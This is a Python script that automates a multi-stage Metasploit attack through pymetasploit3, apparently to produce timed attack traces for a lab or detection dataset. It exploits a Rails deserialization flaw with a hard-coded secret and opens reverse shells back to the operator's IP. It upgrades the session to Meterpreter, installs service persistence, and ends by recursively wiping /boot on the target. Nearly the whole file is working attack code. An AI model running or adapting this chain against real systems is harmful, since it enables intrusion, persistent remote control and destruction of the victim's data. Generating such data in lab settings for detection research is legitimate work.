import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    if len(argv) != 5:
        print("Usage: {} Folder local_ip target_ip duration flag_finish".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]
    flag_finish = argv[4]
    wipe_disk_folder = "/boot"

    client = MsfRpcClient('kali')

    exploit = client.modules.use('exploit', 'multi/http/rails_secret_deserialization')
    payload = client.modules.use('payload', 'ruby/shell_reverse_tcp')

    exploit['RHOSTS'] = target_ip
    exploit['RPORT'] = 8181
    exploit['TARGETURI'] = '/'
    exploit['SECRET'] = 'a7aebc287bba0ee4e64f947415a94e5f'
    payload['LHOST'] = my_ip
    payload['LPORT'] = 4444

    output_time_file = 'time_stage_1_start.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)
    #print('Start 1')

    exploit.execute(payload=payload)

    while client.jobs.list:
        time.sleep(1)

    # print(client.sessions.list['1'])

    exploit = client.modules.use('post', 'multi/manage/shell_to_meterpreter')
    exploit['SESSION'] = 1
    exploit.execute()

    while client.jobs.list:
        time.sleep(1)

    time.sleep(10)
    output_time_file = 'time_stage_1_end.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)

    #print('Finish 1')
    # print(client.sessions.list['2'])

    exploit = client.modules.use('exploit', 'linux/local/service_persistence')
    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
    exploit['SESSION'] = 2
    exploit['VERBOSE'] = True
    payload['LHOST'] = my_ip

    time.sleep(2)
    output_time_file = 'time_stage_2_start.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)
    #print('Start 2')

    exploit.execute(payload=payload)

    while client.jobs.list:
        time.sleep(1)

    #print('Finish 2')
    #print(client.sessions.list['3'])

    client.sessions.session('1').stop()
    client.sessions.session('2').stop()
    client.sessions.session('3').stop()

    time.sleep(10)
    output_time_file = 'time_stage_2_end.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)

    exploit = client.modules.use('exploit', 'multi/handler')
    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
    payload['LHOST'] = my_ip

    time.sleep(2)
    output_time_file = 'time_stage_3_start.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)
    #print('Start 3')

    exploit.execute(payload=payload)

    while client.jobs.list:
        time.sleep(1)

    #print(client.sessions.list['4'])

    shell = client.sessions.session('4')
    shell.write('apt install wipe -y')
    shell.write("wipe -r -f {0}".format(wipe_disk_folder))

    print(flag_finish)


main(sys.argv)
